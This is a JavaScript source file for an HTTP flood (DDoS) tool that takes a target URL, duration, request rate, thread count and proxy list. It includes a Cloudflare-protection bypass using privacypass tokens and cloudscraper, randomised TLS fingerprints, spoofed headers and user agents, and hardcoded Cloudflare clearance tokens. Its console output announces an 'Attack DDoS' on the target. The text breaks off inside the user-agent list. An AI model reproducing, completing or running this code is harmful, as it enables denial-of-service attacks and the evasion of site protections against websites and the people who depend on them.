const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');
const {
  HeaderGenerator
} = require('header-generator');

module.exports = function Cloudflare() {
    const privacypass = require('./privacypass'),
        cloudscraper = require('cloudscraper'),
        request = require('request'),
        fs = require('fs');
    var privacyPassSupport = true;
    function useNewToken() {
        privacypass(l7.target);
        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
    }

    if (l7.firewall[1] == 'captcha') {
        privacyPassSupport = l7.firewall[2];
        useNewToken();
    }

    function bypass(proxy, uap1, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
        var cookie = "";
        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
            request.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uap1,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res) => {
                if (!res) {
                    return false;
                }
                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {

                } else {
                    if (l7.firewall[1] == 'captcha') {
                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
                        return false;
                    } else {
                        privacyPassSupport = false;
                    }
                }

                cookie = res.headers['set-cookie'].shift().split(';').shift();
                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        gzip: true,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uap1,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US;q=0.9',
                            'challenge-bypass-token': l7.privacypass,
                            "Cookie": cookie
                        }
                    }, (err, res) => {
                        if (err || !res) return false;
                        if (res.headers['set-cookie']) {
                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                            cloudscraper.get({
                                url: l7.target + "?_asds=" + num,
                                proxy: proxy,
                                headers: {
                                    'Connection': 'Keep-Alive',
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': uap1,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US;q=0.9',
                                    "Cookie": cookie
                                }
                            }, (err, res, body) => {
                                if (err || !res || res && res.statusCode == 403) {
                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
                                    useNewToken();
                                    return;
                                }
                                callback(cookie);
                            });
                        } else {
                            console.log(res.statusCode, res.headers);
                            if (res.headers['cf-chl-bypass-resp']) {
                                let respHeader = res.headers['cf-chl-bypass-resp'];
                                switch (respHeader) {
                                    case '6':
                                        console.warn("[privacy-pass]: internal server connection error occurred");
                                        break;
                                    case '5':
                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                        useNewToken();
                                        break;
                                    case '7':
                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
                                        break;
                                    case '8':
                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                        break;
                                }
                                return bypass(proxy, uap1, callback, true);
                            }
                        }
                    });
                } else {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uap1,
                            'Accept-Language': 'en-US;q=0.9'
                        }
                    }, (err, res) => {
                        if (err || !res || !res.request.headers.cookie) {
                            if (err) {
                                if (err.name == 'CaptchaError') {
                                    return bypass(proxy, uap1, callback, true);
                                }
                            }
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                }
            });
        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uap1
                }
            }, (err, res, body) => {
                if (err) {
                    if (err.name == 'CaptchaError') {
                        return bypass(proxy, uap1, callback, true);
                    }
                    return false;
                }
                if (res && res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else if (res && body && res.headers.server == 'cloudflare') {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uap1, callback, true);
                    }
                } else {

                }
            });
        } else {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uap1,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uap1, callback, true);
                    }
                    return false;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
        }
    }

    return bypass;
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7){console.log(`Example: target time rate thread proxy.txt`); process.exit();}
const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
   const now = new Date();
   const hours = now.getHours().toString().padStart(2, '0');
   const minutes = now.getMinutes().toString().padStart(2, '0');
   const seconds = now.getSeconds().toString().padStart(2, '0');
   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
 };

 const targetURL = process.argv[2];
 const agent = new https.Agent({ rejectUnauthorized: false });

 function getStatus() {
 const timeoutPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
     reject(new Error('Request timed out'));
   }, 5000);
 });

 const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     const { status, data } = response;
   })
   .catch((error) => {
     if (error.message === 'Request timed out') {
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
     } else {
     
     }
   });
}

let headerGenerator = new HeaderGenerator({
  'browsers': [{
    'name': "firefox",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "opera",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "edge",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "safari",
    'minVersion': 0x10,
    'httpVersion': '2'
  }],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', "linux", "macos", 'android', 'ios'],
  'locales': ["en-US", 'en']
});
let randomHeaders = headerGenerator.getHeaders();

function getTitleFromHTML(html) {
  const titleRegex = /<title>(.*?)<\/title>/i;
  const match = html.match(titleRegex);
  if (match && match[1]) {
    return match[1];
  }
  return 'Not Found';
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

function randomString(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  ;
  return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 


const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}
if (cluster.isMaster){
 for (let i = 1; i <= process.argv[5]; i++){
  console.clear()
  console.log('Method by @baidajah\n')
  console.log('Succesfuly Attack Info:');
  console.log('URL/Target: ' + process.argv[2]);
  console.log('Time: ' + process.argv[3]);
  console.log('RPS/Request Per Second: ' + process.argv[4]);
  console.log('Threads: ' + process.argv[5] + 'x');
  console.log('Name Proxy File: ' + process.argv[6]);
  console.log('If Need Stop Attack DDoS [CTRL+Z] Or [CTRL+C]')
   cluster.fork();
 }
 setInterval(getStatus, 2000);
 setTimeout(() => {
   process.exit(1);
 }, process.argv[3] * 1000);
} 


const cplist = [
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'
];

const hihi = [ "require-corp", "unsafe-none", ];

const sigalgs = [
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
'ecdsa_brainpoolP256r1tls13_sha256',
'ecdsa_brainpoolP384r1tls13_sha384',
'ecdsa_brainpoolP512r1tls13_sha512',
'ecdsa_sha1',
'ed25519',
'ed448',
'ecdsa_sha224',
'rsa_pkcs1_sha1',
'rsa_pss_pss_sha256',
'dsa_sha256',
'dsa_sha384',
'dsa_sha512',
'dsa_sha224',
'dsa_sha1',
'rsa_pss_pss_sha384',
'rsa_pkcs1_sha2240',
'rsa_pss_pss_sha512',
'sm2sig_sm3',
'ecdsa_secp521r1_sha512'
];

const cookie = [
  "--no-sandbox",
  "--disable-setuid-sandbox",
  "--disable-infobars",
  "--disable-logging",
  "--disable-login-animations",
  "--disable-notifications",
  "--disable-gpu",
  "--headless",
  "--lang=ko_KR",
  "--start-maxmized",
  "--ignore-certificate-errors",
  "--hide-scrollbars",
  "--mute-audio",
  "--disable-web-security",
  "--incognito",
  "--disable-canvas-aa",
  "--disable-2d-canvas-clip-aa",
  "--disable-accelerated-2d-canvas",
  "--no-zygote",
  "--use-gl=desktop",
  "--disable-gl-drawing-for-tests",
  "--disable-dev-shm-usage",
  "--no-first-run",
  "--disable-features=IsolateOrigins,site-per-process",
  "--ignore-certificate-errors-spki-list",
  "--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
  "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
  "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
  "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
  "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
  "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
  "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
  "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
  "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
  "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
  "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
  "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
  "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
  "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
  "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
  "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
  "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
  "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
  "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
  "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
  "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
  "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
  "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
  "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
  "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
  "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
  "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
  "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
  "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
  "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
  "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
  "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
  "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
  "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
  "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
  "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
  "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
  ];
  const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];

const refers = [
  "https://www.google.com/",
  "https://www.facebook.com/",
  "https://www.twitter.com/",
  "https://www.youtube.com/",
  "https://www.linkedin.com/",
  "https://proxyscrape.com/",
  "https://www.instagram.com/",
  "https://wwww.reddit.com/",
  "https://fivem.net/",
  "https://www.fbi.gov/",
  "https://nettruyenplus.com/",
  "https://vnexpress.net/",
  "https://zalo.me",
  "https://shopee.vn",
  "https://www.tiktok.com/",
  "https://google.com.vn/",
  "https://tuoitre.vn/",
  "https://thanhnien.vn/",
  "https://nettruyento.com/"

 ];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
 "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
 "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
 "portalmmm/2.0 N410i(c20;TB) ",
 "Python-urllib/2.5",
 "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
 "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
 "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
 "SearchExpress",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224",
 "More Internet Explorer 8.0 user agents strings -->>",
 "Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
 "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
